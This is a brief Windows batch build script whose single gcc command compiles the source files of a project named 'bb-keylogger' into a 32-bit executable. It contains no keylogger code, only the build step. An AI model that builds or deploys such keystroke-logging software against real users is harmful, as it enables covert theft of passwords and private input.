rem Compile the executable from the sources
rem ---------------------------------------
rem Compilation used for release :
rem ---------------------------------------
gcc -Wall -O3 -m32 ../bb-keylogger.c ../bb-keylogger-file.c ../bb-keylogger-keyboard.c ../bb-keylogger-system.c -o ../bin/bb-keylogger-v0.2-32bits.exe
